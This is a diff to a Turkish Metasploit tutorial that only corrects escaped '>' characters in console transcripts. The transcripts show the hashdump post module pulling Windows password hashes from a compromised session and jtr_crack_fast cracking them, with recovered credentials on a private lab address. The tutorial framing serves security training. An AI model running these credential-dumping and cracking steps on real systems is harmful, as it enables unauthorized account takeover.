@@ -34,11 +34,11 @@ Metasploit içerisinde de John The Ripper kullanabilirsiniz. Burada kullanılaca
 
 
 ```bash
-msf auxiliary**(**handler**)** **&gt;** use post/windows/gather/hashdump
-msf post**(**hashdump**)** **&gt;** set session 1
-session **=&gt;** 1
+msf auxiliary**(**handler**)** **>** use post/windows/gather/hashdump
+msf post**(**hashdump**)** **>** set session 1
+session **=>** 1
  
-msf post**(**hashdump**)** **&gt;** run
+msf post**(**hashdump**)** **>** run
 
 **[*********]** Obtaining the boot key...
 **[*********]** Calculating the hboot key using SYSKEY bffad2dcc991597aaa19f90e8bc4ee00...
@@ -64,8 +64,8 @@ Hash bilgilerini ekranda görebilirsiniz. Şimdi `auxiliary/analyze/jtr_crack_fa
 
 
 ```bash
-msf post**(**hashdump**)** **&gt;** use auxiliary/analyze/jtr_crack_fast
-msf auxiliary**(**jtr_crack_fast**)** **&gt;** run
+msf post**(**hashdump**)** **>** use auxiliary/analyze/jtr_crack_fast
+msf auxiliary**(**jtr_crack_fast**)** **>** run
 
 **[*********]** Seeded the password database with 8 words...
 
@@ -103,7 +103,7 @@ guesses: 0  time: 0:00:00:00 DONE **(**Sat Jul 16 19:59:27 2011**)**  c/s: 7407K
 **[**+] Cracked: Guest: **(**192.168.184.134:445**)**
 **[**+] Cracked: rAWjAW2:password **(**192.168.184.134:445**)**
 **[*********]** Auxiliary module execution completed
-msf auxiliary**(**jtr_crack_fast**)** **&gt;**
+msf auxiliary**(**jtr_crack_fast**)** **>**
 ```
 
 
